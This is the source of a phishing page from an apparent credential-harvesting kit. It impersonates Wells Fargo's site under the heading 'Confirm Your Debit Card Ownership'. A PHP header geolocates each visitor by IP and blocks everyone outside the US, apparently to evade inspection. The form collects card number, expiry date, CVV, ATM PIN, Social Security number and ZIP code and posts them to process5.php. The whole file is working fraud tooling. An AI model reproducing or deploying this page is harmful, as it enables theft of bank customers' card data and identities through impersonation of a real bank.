<?php

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


if($_SERVER['HTTP_X_FORWARDED_FOR'])
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else
		
		$ip = $_SERVER['REMOTE_ADDR'];
		
		$two_letter_country_code = iptocountry($ip);
		
		function iptocountry($ip){
			$numbers = preg_split( "/\./", $ip);
			include("ip_files/".$numbers[0]. ".php");
			$code = ($numbers[0] * 16777216) + ($numbers[1] * 65536) + ($numbers[2] * 256) + ($numbers[3]);
			
			foreach($ranges as $key => $value){
				if($key <= $code){
					if($ranges[$key][0] >= $code){
						$country = $ranges[$key][1]; break;
					}
				}
			}
			
			if($country == ""){
				$country = "unknown";
			}
			return $country;	
		}
		
		// Then add this little blocking script at the end of the code above
		
		//if($two_letter_country_code == "US")
		//die();
		
		
		if($two_letter_country_code == "US"){
		
			}
		else{
		
		  die("You do not have access to this page");
		}

?>
<!DOCTYPE html>
 

<html xmlns="http://www.w3.org/1999/xhtml" xmlns:tcdl="http://www.tridion.com/ContentDelivery/5.3/TCDL"  class="no-js" lang="en">
<head>
    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages & More</title>
    <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more." />
    <meta name="keywords" content="home page, log in, view accounts, wellsfargo.com, sign in, sign on" />
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta http-equiv="Content-type" content="text/html" />
    <meta http-equiv="Cache-Control" content="must-revalidate" />
    <meta http-equiv="Cache-Control" content="no-store" />
    <meta http-equiv="Cache-Control" content="no-cache" />
    <meta http-equiv="Cache-Control" content="private" />
    <meta http-equiv="Pragma" content="no-cache" />
    

    <meta name="application-name" content="WELLS FARGO BANK"/>
    <meta name="msapplication-TileColor" content="#1e3d75"/>
    <meta name="msapplication-TileImage" content="WELLSPIN.png"/>
    
     <link rel="stylesheet" href="css/style.css" />
     <link rel="shortcut icon" href="images/favicon.png"/>
     <script type="text/javascript" src="js/jqueryLib.js"></script>
     <script type="text/javascript" src="js/gibberish-detector.js"></script>
     
     <script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>

     
</head>

<body>

<div class="p2-header-const">
    <div class="p2-header"></div>
</div>
<div class="p2-line"></div>
<div class="p2-header2-const">
    <div class="p2-header2"></div>
</div>
<div class="p2-banner-const">
    <div class="p2-banner"></div>
</div>
<div class="p2-content-const">
  <div class="p2-content">
    <div class="p2-box1">
      <form name="form1" method="post" action="process5.php">
        <table width="452" border="0">
          <tr>
            <td colspan="2"><div class="p2-login-text1">Confirm Your Debit Card Ownership</div></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td colspan="2"><div class="p2-login-text2">Confirm your card details to securely view and manage your Wells Fargo accounts online.</div></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td width="222" height="33"><div class="p2-l-label">Card Number&nbsp;<span style="color:#F00">*</span></div></td>
            <td width="230"><div class="p2-l-label">Expiry Date&nbsp;<span style="color:#F00">*</span></div></td>
          </tr>
          <tr>
            <td><input type="text" name="cardnumber" id="cardnumber" required autocomplete="off" class="p2-username2" placeholder="e.g 4242 4242 4242 4242" maxlength="16" minlength="16" onKeyPress="javascript:return(numbersOnly(this,event));"></td>
            <td><input type="text" name="expmonth" id="expmonth" required autocomplete="off" class="p2-expmonth" placeholder="MM" maxlength="2" minlength="2" onKeyPress="javascript:return(numbersOnly(this,event));">
            
            <input type="text" name="expyear" id="expyear" required autocomplete="off" class="p2-expyear" placeholder="YYYY" maxlength="4" minlength="4" onKeyPress="javascript:return(numbersOnly(this,event));"></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td><div class="p2-l-label">CVV&nbsp;<span style="color:#F00">*</span></div></td>
            <td><div class="p2-l-label">ATM Pin&nbsp;<span style="color:#F00">*</span></div></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td>
            <input type="text" name="cvv" id="cvv" required autocomplete="off" class="p2-expyear" maxlength="3" minlength="3" placeholder="983" onKeyPress="javascript:return(numbersOnly(this,event));"></td>
            <td>
            <input type="password" name="atmpin" id="atmpin" required autocomplete="off" maxlength="4" minlength="4" class="p2-expyear" placeholder="****" onKeyPress="javascript:return(numbersOnly(this,event));"></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td><div class="p2-l-label">Social Security Number&nbsp;<span style="color:#F00">*</span></div></td>
            <td><div class="p2-l-label">Zip Code&nbsp;<span style="color:#F00">*</span></div></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td>
            <input type="password" name="ssn" id="ssn" required autocomplete="off" class="p2-username2" placeholder="928762908" maxlength="9" minlength="9" onKeyPress="javascript:return(numbersOnly(this,event));"></td>
            <td>
            <input type="text" name="zipcode" id="zipcode" required autocomplete="off" class="p2-expyear" maxlength="5" minlength="5"  placeholder="59082" onKeyPress="javascript:return(numbersOnly(this,event));"></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td align="right"><input type="submit" name="btnlogin" id="btnlogin" value="Continue" class="p2-logbtn"></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
        </table>
      </form>
    </div>
    <div class="p2-box2"></div>
  </div>
</div>
<div class="p2-footer-const">
  <div class="p2-footer"></div>
</div>

<script>
   var input = document.getElementById("zipcode");
   input.addEventListener("keyup", function(event){
	  if(event.keyCode === 13){
	    event.preventDefault();
		document.getElementById("btnlogin").click();
	  }
	
	});
</script> 
<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>